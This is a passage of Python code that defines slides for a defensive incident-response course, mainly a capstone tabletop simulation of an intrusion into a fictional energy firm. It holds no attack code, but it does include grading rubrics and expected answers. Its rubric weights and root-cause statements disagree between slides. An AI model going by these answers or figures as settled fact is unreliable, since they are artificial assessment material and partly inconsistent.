                      <li>[ ] Machine-readable JSON playbook schema <code>PB-RANSOMWARE-001.json</code> saved.</li>
                      <li>[ ] Documented rollback procedure for false positive de-isolation.</li>
                    </ul>
                  </div>

                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">⚖️ Assessment Rubric (100 Points)</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: #FFF;">Playbook Flowchart Completeness:</td><td><strong>40 Pts</strong> (Clean logic from trigger to restore)</td></tr>
                      <tr><td style="color: #FFF;">Human Approval Gate Rigor:</td><td><strong>30 Pts</strong> (Appropriate role authorization & stasis)</td></tr>
                      <tr><td style="color: #FFF;">JSON Schema Validity:</td><td><strong>30 Pts</strong> (OASIS CACAO / IBM SOAR compliance)</td></tr>
                      <tr><td style="color: var(--cyber-cyan);">Total Passing Standard:</td><td><strong>75% or higher</strong></td></tr>
                    </table>
                  </div>
                </div>
                
                <div style="text-align: center; margin-top: 16px;">
                  <span class="cyber-badge badge-green" style="font-size: 12px; padding: 6px 18px;">LAB-07 OFFICIAL COMPLETION VERIFIED // PROCEED TO CAPSTONE SIMULATION</span>
                </div>
              </div>
            ''',
            "notes_say": "Save your JSON playbook schema. You now have the defensive engineering foundation needed for our final exercise: Lab 8, the AeroGrid APT Capstone Simulation.",
            "notes_pedagogy": "Verify student readiness before initiating the capstone injection clock."
        }
    ]


def get_lab08_slides():
    """Day 6 Capstone: LAB 08 — Capstone Enterprise Incident Response Tabletop Simulation (AeroGrid Dynamics)"""
    return [
        # Slide A: Intro
        {
            "title": "LAB 08 (Part 1/7): Introduction & Objectives",
            "day": "DAY 06",
            "module": "MOD-06C: CAPSTONE APT SIMULATION",
            "session": "LAB-08 [A: INTRO]",
            "ref": "Handbook Lab Manual 8 — Section 8.1",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-red">LAB-08: STEP 1 OF 7 // CAPSTONE APT CRISIS SIMULATION</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Capstone Enterprise IR Tabletop Simulation</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Full-spectrum multi-stage APT crisis response against the fictional enterprise 'AeroGrid Dynamics'.</p>
                
                <div class="grid-3" style="margin-top: 18px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">🎯 Core Learning Objectives</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Synthesize all course skills: CTI triage, ATT&CK mapping, log correlation & containment.</li>
                      <li>Handle live crisis injections: Initial beacon, lateral movement, exfiltration spike.</li>
                      <li>Author and defend an executive-ready Incident Response Final Report with RCA.</li>
                    </ul>
                  </div>
                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 13px;">⏱️ Parameters & Scope</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li><strong>Estimated Duration:</strong> 60 Minutes (Live Crisis Execution).</li>
                      <li><strong>Instructional Framework:</strong> IBM ICE & Multi-Stage APT Tabletop.</li>
                      <li><strong>PLO Mapping:</strong> PLO-8 (End-to-end investigation & reporting).</li>
                    </ul>
                  </div>
                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">📦 Required Deliverables</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Completed 6-Section Executive Incident Response Final Report.</li>
                      <li>Consolidated ATT&CK Navigator Layer mapping observed adversary TTPs.</li>
                      <li>15-Minute Pod Defense of Root Cause Analysis and Hardening Roadmap.</li>
                    </ul>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "This is the moment everything comes together. You are no longer students; you are the CSIRT leadership team of AeroGrid Dynamics responding to an active nation-state intrusion against industrial grid controllers.",
            "notes_pedagogy": "Set a serious, immersive, professional tone. Announce that the simulation runs in real time across three sequential injections."
        },

        # Slide B: Setup
        {
            "title": "LAB 08 (Part 2/7): Environment Preparation",
            "day": "DAY 06",
            "module": "MOD-06C: CAPSTONE APT SIMULATION",
            "session": "LAB-08 [B: SETUP]",
            "ref": "Handbook Lab Manual 8 — Section 8.2",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-08: STEP 2 OF 7 // WORKSTATION PREPARATION</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Full Toolchain Integration & Master Dossier</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Arming the complete defensive workbench and verifying simulated telemetry packages.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">💻 Unified Defense Workbench</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: #FFF;">Workstation:</td><td>LH3 SOC Pod Workstation (Collaborative Team Setup)</td></tr>
                      <tr><td style="color: #FFF;">Tools:</td><td>CyberChef, ATT&CK Navigator, Python Pandas, VS Code</td></tr>
                      <tr><td style="color: #FFF;">Dossier:</td><td><code>capstone_incident_dossier.md</code></td></tr>
                      <tr><td style="color: #FFF;">Target:</td><td>AeroGrid Dynamics Renewable Energy Grid Network</td></tr>
                    </table>
                  </div>
                  
                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 13px;">⚡ Pre-Flight Verification Commands</strong>
                    <p style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Confirm all capstone datasets in PowerShell:</p>
                    <div class="terminal-buffer" style="margin-top: 8px; font-size: 11px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># 1. Verify existence of master capstone dossier</span>
Test-Path "C:\\Threat_Intel_IR_2026\\06_Datasets\\capstone_incident_dossier.md"
<span class="terminal-cmd"># 2. Check full workbench tools availability</span>
python -c "import pandas, stix2; print('Python Forensics Stack: OK')"
                      </div>
                    </div>
                    <div style="font-size: 10px; color: var(--emerald-pass); margin-top: 4px;">✓ Expected response: 'True' and 'Python Forensics Stack: OK'</div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Designate roles within your pod: one analyst on telemetry logs, one on ATT&CK mapping, one on CTI enrichment, and the pod lead on the executive report.",
            "notes_pedagogy": "Ensure pods divide responsibilities cleanly to handle the timed injections effectively."
        },

        # Slide C: Procedure
        {
            "title": "LAB 08 (Part 3/7): Step-by-Step Procedure",
            "day": "DAY 06",
            "module": "MOD-06C: CAPSTONE APT SIMULATION",
            "session": "LAB-08 [C: PROCEDURE]",
            "ref": "Handbook Lab Manual 8 — Section 8.4",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-amber">LAB-08: STEP 3 OF 7 // CRISIS INJECTION PROTOCOL</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Sequential 4-Phase Crisis Execution</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Respond to three timed crisis injections and author the final investigation report.</p>
                
                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 14px;">
                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--cyber-cyan); font-size: 12px;">INJECTION 1: Initial Offense Triage (Minutes 00–15)</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>08:15 UTC: SIEM Offense #4410: PowerShell Beaconing on <code>WS-FIN-04</code> (IP <code>10.10.4.14</code>).</li>
                      <li>Extract destination IP <code>198.51.100.45:8443</code>. Enrich using Lab 1 OSINT and Lab 2 STIX dossiers.</li>
                    </ul>
                  </div>
                  
                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--electric-blue); font-size: 12px;">INJECTION 2: Lateral Pivot & Credential Dumping (Minutes 15–30)</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>09:30 UTC: User <code>jdoe_fin</code> authenticates to FileServer <code>FS-01</code> via WMI.</li>
                      <li>Memory dumping against <code>lsass.exe</code> observed. Map techniques to ATT&CK (T1047, T1003.001).</li>
                    </ul>
                  </div>

                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--alert-crimson); font-size: 12px;">INJECTION 3: Data Exfiltration Attempt & Containment (Minutes 30–45)</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>10:45 UTC: 1.2 GB outbound encrypted stream detected leaving <code>FS-01</code> to external cloud storage.</li>
                      <li>Execute immediate SOAR host network isolation. Sever outbound session via firewall drop rule.</li>
                    </ul>
                  </div>

                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--emerald-pass); font-size: 12px;">PHASE 4: Executive Report & Debrief (Minutes 45–60)</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Compile 6-section report: Exec Summary, Timeline, Attribution/TTPs, Containment Actions, RCA, Lessons Learned.</p>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Injection 3 is the climax: 1.2 GB of confidential turbine telemetry is walking out the door. Trigger your containment playbook immediately.",
            "notes_pedagogy": "Keep time strictly: announce 15-minute marks clearly to simulate real incident command pressure."
        },

        # Slide D: Output
        {
            "title": "LAB 08 (Part 4/7): Expected Output & Report Schema",
            "day": "DAY 06",
            "module": "MOD-06C: CAPSTONE APT SIMULATION",
            "session": "LAB-08 [D: OUTPUT]",
            "ref": "Handbook Lab Manual 8 — Section 8.5",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-green">LAB-08: STEP 4 OF 7 // VERIFIED ARTIFACTS</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Executive Incident Report Structure</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Mandatory 6-section executive report outline required for final submission.</p>
                
                <div class="grid-2" style="margin-top: 14px;">
                  <div>
                    <strong style="color: var(--cyber-cyan); font-size: 12px;">Mandatory 6-Section Report Format:</strong>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px; max-height: 240px; overflow-y: auto;">
                      <div class="terminal-body">
# AEROGRID DYNAMICS — CSIRT FINAL INCIDENT REPORT
INCIDENT ID: INC-20261031-APT | SEVERITY: SEV-1 CRITICAL

1. EXECUTIVE SUMMARY
   - Intrusion narrative, total dwell time (150 min), business impact rating.
2. INCIDENT CHRONOLOGY (UTC)
   - 08:15: Initial beacon | 09:30: WMI lateral move | 10:45: Exfiltration.
3. ADVERSARY ATTRIBUTION & ATT&CK TTPs
   - Actor: UNC-PHOENIX | T1566.001, T1059.001, T1047, T1003.001, T1048.
4. CONTAINMENT & ERADICATION ACTIONS TAKEN
   - EDR isolation of WS-FIN-04 & FS-01 | Firewall drop | KRBTGT rotation.
5. ROOT CAUSE ANALYSIS (RCA)
   - Phishing lure opened; lack of AppLocker macro restrictions and MFA.
6. POSTURE HARDENING & STRATEGIC RECOMMENDATIONS
   - Enforce FIDO2 MFA, attack surface reduction rules, EDR automated blocks.
                      </div>
                    </div>
                  </div>

                  <div>
                    <strong style="color: var(--emerald-pass); font-size: 12px;">Evaluation Checkpoints:</strong>
                    <div class="cyber-card" style="margin-top: 6px; font-size: 11px; line-height: 1.6;">
                      <ul style="color: var(--text-secondary); padding-left: 16px;">
                        <li><strong>Root Cause Precision:</strong> Identifies unsegmented finance workstation as the initial foothold vector.</li>
                        <li><strong>Dwell Time Calculation:</strong> 08:15 UTC to 10:45 UTC = <strong>150 Minutes</strong> total dwell time prior to containment.</li>
                        <li><strong>Data Loss Assessment:</strong> Verifies whether the 1.2 GB exfiltration was completed or truncated by network isolation.</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "When writing your Executive Summary, remember your audience: the Board of Directors does not need raw hex dumps. They need to know what happened, what was contained, and how we ensure it never happens again.",
            "notes_pedagogy": "Guide students to write for C-suite readability: clear, concise, actionable."
        },

        # Slide E: Interpretation
        {
            "title": "LAB 08 (Part 5/7): Technical Interpretation",
            "day": "DAY 06",
            "module": "MOD-06C: CAPSTONE APT SIMULATION",
            "session": "LAB-08 [E: INTERPRETATION]",
            "ref": "Handbook Lab Manual 8 — Section 8.5.2",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-08: STEP 5 OF 7 // ANALYTICAL SYNTHESIS</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Analytical Synthesis & Root Cause Analysis</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Extracting systemic defensive weaknesses and formulating strategic architecture roadmaps.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">🔍 Systemic Root Cause Analysis</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li><strong>Architecture Failure:</strong> Lack of micro-segmentation allowed an unprivileged finance laptop to establish direct WMI RPC connections to core file storage.</li>
                      <li><strong>Identity Vulnerability:</strong> Service accounts held interactive logon rights and lacked Credential Guard protection.</li>
                      <li><strong>Egress Inspection Gap:</strong> High-port outbound traffic (Port 8443) bypassed default egress proxy filtering.</li>
                    </ul>
                  </div>
                  
                  <div class="cyber-card">
                    <strong style="color: var(--purple-intel); font-size: 13px;">🚀 90-Day Enterprise Posture Roadmap</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li><strong>Days 1–30:</strong> Enforce FIDO2 hardware tokens for all privileged administrative accounts; rotate enterprise KRBTGT.</li>
                      <li><strong>Days 31–60:</strong> Deploy Attack Surface Reduction (ASR) rules blocking Office child process creation across all endpoints.</li>
                      <li><strong>Days 61–90:</strong> Implement automated SOAR host network quarantine for all EID 4688 vssadmin tamper alerts.</li>
                    </ul>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Notice that our 90-day roadmap addresses the root causes directly: identity, endpoint execution, and network egress. That is how a mature CSIRT operates.",
            "notes_pedagogy": "Encourage pods to present their 90-day roadmap with concrete timelines and vendor-neutral technologies."
        },

        # Slide F: Troubleshooting
        {
            "title": "LAB 08 (Part 6/7): Troubleshooting & Recovery",
            "day": "DAY 06",
            "module": "MOD-06C: CAPSTONE APT SIMULATION",
            "session": "LAB-08 [F: TROUBLESHOOTING]",
            "ref": "Handbook Lab Manual 8 — Section 8.7",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-red">LAB-08: STEP 6 OF 7 // ERROR RESOLUTION & RECOVERY</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Crisis Management Pitfalls & Time Recovery</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Maintaining analytical focus and recovery under simulated incident response pressure.</p>
                
                <div class="grid-2" style="margin-top: 14px;">
                  <div class="cyber-card">
                    <strong style="color: var(--alert-crimson); font-size: 12px;">Issue 1: Pod Getting Bogged Down in Log Parsing During Live Injections</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Occurs if team members duplicate work rather than dividing investigative roles.</p>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># Incident Commander Protocol:</span>
<span class="terminal-cmd">- Assign Analyst 1: Extract IOCs from Injection 1</span>
<span class="terminal-cmd">- Assign Analyst 2: Map observed techniques in ATT&CK Navigator</span>
<span class="terminal-cmd">- Assign Pod Lead: Synthesize timeline and draft report sections</span>
                      </div>
                    </div>
                  </div>

                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 12px;">Issue 2: Incomplete Incident Report Due to Time Running Out</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Teams often spend too much time on narrative and leave RCA blank.</p>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># Recovery: Prioritize high-weight rubric sections:</span>
<span class="terminal-cmd">Executive Summary (25%) + RCA & Recommendations (35%)</span>
<span class="terminal-cmd">Use bulleted technical tables rather than lengthy prose</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "If your pod is falling behind on time, rely on bullet points and technical tables. An executive wants clear, bulleted answers, not a 40-page novel.",
            "notes_pedagogy": "Guide pods on time management during the final 15 minutes of report compilation."
        },

        # Slide G: Assessment
        {
            "title": "LAB 08 (Part 7/7): Completion & Assessment",
            "day": "DAY 06",
            "module": "MOD-06C: CAPSTONE APT SIMULATION",
            "session": "LAB-08 [G: ASSESSMENT]",
            "ref": "Handbook Lab Manual 8 — Section 8.6",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-green">LAB-08: STEP 7 OF 7 // COURSE GRADUATION & FINAL AUDIT</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Capstone Deliverables & Program Graduation</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Final submission checklist and program completion verification.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">📋 Capstone Submission Checklist</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.8;">
                      <li>[ ] Complete 6-section Executive Incident Response Final Report submitted.</li>
                      <li>[ ] Consolidated ATT&CK Navigator JSON layer and heatmap image attached.</li>
                      <li>[ ] Pod verbal defense of Root Cause Analysis and 90-day roadmap delivered.</li>
                      <li>[ ] All 8 course lab manuals verified complete across all 6 training days.</li>
                    </ul>
                  </div>

                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">⚖️ Capstone Rubric (100 Points)</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: #FFF;">Forensic Timeline & Indicator Accuracy:</td><td><strong>30 Pts</strong> (Flawless injection chronology)</td></tr>
                      <tr><td style="color: #FFF;">ATT&CK Mapping & CTI Synthesis:</td><td><strong>30 Pts</strong> (Comprehensive technique coverage)</td></tr>
                      <tr><td style="color: #FFF;">Executive Report Quality & RCA:</td><td><strong>40 Pts</strong> (C-suite readiness & actionable roadmap)</td></tr>
                      <tr><td style="color: var(--cyber-cyan);">Capstone Passing Standard:</td><td><strong>80% or higher</strong></td></tr>
                    </table>
                  </div>
                </div>
                
                <div style="text-align: center; margin-top: 16px;">
                  <span class="cyber-badge badge-green" style="font-size: 13px; padding: 8px 24px; font-weight: bold;">
                    🎓 COURSE REQUIREMENTS 100% COMPLETED // TRANSITION TO OPERATIONAL SOC DEFENDER
                  </span>
                </div>
              </div>
            ''',
            "notes_say": "Congratulations to every pod. You have successfully navigated 6 days, 26.5 gross hours, 8 intensive hands-on labs, and a full-spectrum APT tabletop simulation. You are ready to defend enterprise networks.",
            "notes_pedagogy": "Lead a classroom round of applause for all 24 students across the 6 pods. Celebrate their transformation from alert janitors to adversary-centric defenders."
        }
    ]
